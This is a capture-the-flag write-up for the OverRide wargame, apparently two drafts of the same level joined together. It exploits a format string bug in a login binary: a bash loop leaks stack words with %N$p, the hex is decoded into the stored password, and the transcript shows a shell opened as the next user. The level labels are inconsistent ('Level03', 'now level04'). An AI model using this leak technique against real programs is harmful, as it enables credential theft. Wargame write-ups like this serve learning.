in the elf, the main get the next flag:

    int fd = fopen("/home/users/level03/.pass", "r");
    [...]
    char buf[41];
    int len = fread(buf, 1, 41, fd);

we also have a function that print what user input:

    char username[100];
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    [...]
    printf(username);
    puts(" does not have access!");

if we merge both idea we can use the printf (not protected) to print the data in the stack and those the password

this is a simple bash functions that display contents from the stack:

```bash
for i in {1..42};
    do echo $i %$i\$p | ./level02 | grep does;
done
```

when runing it we see differents data most between 22 and 26, it can be the password

    22 0x756e505234376848 does not have access!
    23 0x45414a3561733951 does not have access!
    24 0x377a7143574e6758 does not have access!
    25 0x354a35686e475873 does not have access!
    26 0x48336750664b394d does not have access!

let convert them from [hex to ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html) and [reverse](https://string-functions.com/reverse.aspx) those:

    0x756e505234376848 -> Hh74RPnu
    0x45414a3561733951 -> Q9sa5JAE
    0x377a7143574e6758 -> XgNWCqz7
    0x354a35686e475873 -> sXGnh5J5
    0x48336750664b394d -> M9KfPg3H

let's try by merging them:

    level02@OverRide:~$ ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: bg ultime
    --[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
    *****************************************
    Greetings, bg ultime!
    $ whoami
    level03

# Level03

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector -z execstack -z norelro source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
    FILE *file; // -0x8(%rbp)
    int len; // -0xc(%rbp)
    char username[100] = { 0 }; // -0x70(%rbp)
    char flag[41] = { 0 }; // -0xa0(%rbp)
    char password[100] = { 0 }; // -0x110(%rbp)

    file = 0;
    len = 0;

    file = fopen("/home/users/level03/.pass", "r");
    if (file == 0)
    {
        fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
        exit(1);
    }

    len = fread(flag, 1, 41, file);
    flag[strcspn(flag, "\n")] = 0;
    if (len != 41)
    {
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        exit(1);
    }

    fclose(file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");

    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = 0;

    printf("--[ Password: ");
    fgets(password, 100, stdin);
    password[strcspn(password, "\n")] = 0;

    puts("*****************************************");

    if (strncmp(flag, password, 41) == 0)
    {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return 0;
    }

    printf(username);
    puts(" does not have access!");
    exit(1);
}
```

Let's focus on the `main` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However, the `printf` function is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability.
> You can read more about format string vulnerabilities [here](https://owasp.org/www-community/attacks/Format_string_attack).

We notice from the C code that the password is read from a file and stored in the `flag` variable. The `strncmp` function is used to compare the `flag` and `password` variables. If the comparison is successful, the program will execute `/bin/sh`. Since the `flag` variable is stored on the stack, we can use a format string vulnerability to read its value.

To locate our variable on the stack, we'll use this simple bash script:
```bash
for i in {1..42};
    do echo $i %$i\$p | ./level02 | grep does;
done
```
Which will print the stack values for the first 42 arguments. We can then convert the hexadecimal values to ASCII and reverse them to get the password.
```bash
level02@OverRide:~$ for i in {1..42};     do echo $i %$i\$p | ./level02 | grep does; done
[...]
22 0x756e505234376848 does not have access!
23 0x45414a3561733951 does not have access!
24 0x377a7143574e6758 does not have access!
25 0x354a35686e475873 does not have access!
26 0x48336750664b394d does not have access!
[...]
```
> The reason why our variable is located between the 22nd and 26th addresses is because the `flag` variable is located at `-0xa0(%rbp)` which is 160 in decimal, just add 16 (for the ret address, argc, argv, and envp) and you get 176 which devided by 8 (our addresses are 8 bytes long because 64 bits) is 22.

We appear to have found the password, let's convert it to ASCII:
```
0x756e505234376848 -> Hh74RPnu
0x45414a3561733951 -> Q9sa5JAE
0x377a7143574e6758 -> XgNWCqz7
0x354a35686e475873 -> sXGnh5J5
0x48336750664b394d -> M9KfPg3H

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Let's try to log in with the password we found:
```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: assxios
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, assxios!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

We are now level04! Let's move on to the next level.

